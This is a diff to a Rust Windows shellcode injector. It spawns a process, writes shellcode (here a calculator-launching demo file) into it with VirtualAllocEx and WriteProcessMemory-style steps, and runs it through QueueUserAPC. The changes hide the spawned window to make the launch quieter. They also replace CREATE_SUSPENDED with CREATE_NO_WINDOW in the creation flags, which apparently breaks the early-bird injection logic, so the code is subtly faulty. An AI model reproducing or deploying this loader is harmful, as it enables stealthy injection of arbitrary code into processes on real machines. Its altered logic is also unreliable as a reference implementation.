@@ -9,12 +9,12 @@ use windows_sys::Win32::System::Memory::{
     VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_READWRITE,
 };
 use windows_sys::Win32::System::Threading::{
-    CreateProcessA, QueueUserAPC, ResumeThread, CREATE_SUSPENDED, PROCESS_INFORMATION,
-    STARTF_USESTDHANDLES, STARTUPINFOA,
+    CreateProcessA, QueueUserAPC, ResumeThread, CREATE_NO_WINDOW, CREATE_SUSPENDED,
+    PROCESS_INFORMATION, STARTF_USESTDHANDLES, STARTUPINFOA,
 };
 
-static SHELLCODE: [u8; 98] = *include_bytes!("../../w64-exec-calc-shellcode-func.bin");
-static SIZE: usize = SHELLCODE.len();
+const SHELLCODE: &[u8] = include_bytes!("../../w64-exec-calc-shellcode-func.bin");
+const SIZE: usize = SHELLCODE.len();
 
 #[cfg(target_os = "windows")]
 fn main() {
@@ -25,7 +25,7 @@ fn main() {
         let mut pi: PROCESS_INFORMATION = zeroed();
         let mut si: STARTUPINFOA = zeroed();
         si.dwFlags = STARTF_USESTDHANDLES | CREATE_SUSPENDED;
-        si.wShowWindow = 1;
+        si.wShowWindow = 0;
 
         let res = CreateProcessA(
             program.as_ptr(),
@@ -33,7 +33,7 @@ fn main() {
             null(),
             null(),
             TRUE,
-            CREATE_SUSPENDED,
+            CREATE_NO_WINDOW,
             null(),
             null(),
             &si,
@@ -51,7 +51,7 @@ fn main() {
             MEM_COMMIT | MEM_RESERVE,
             PAGE_READWRITE,
         );
-        if dest == null_mut() {
+        if dest.is_null() {
             eprintln!("VirtualAllocEx failed!");
             return;
         }
@@ -80,12 +80,7 @@ fn main() {
             eprintln!("QueueUserAPC failed!");
             return;
         }
-        loop {
-            let res = ResumeThread(pi.hThread);
-            if res > 0 {
-                break;
-            }
-        }
+        ResumeThread(pi.hThread);
 
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
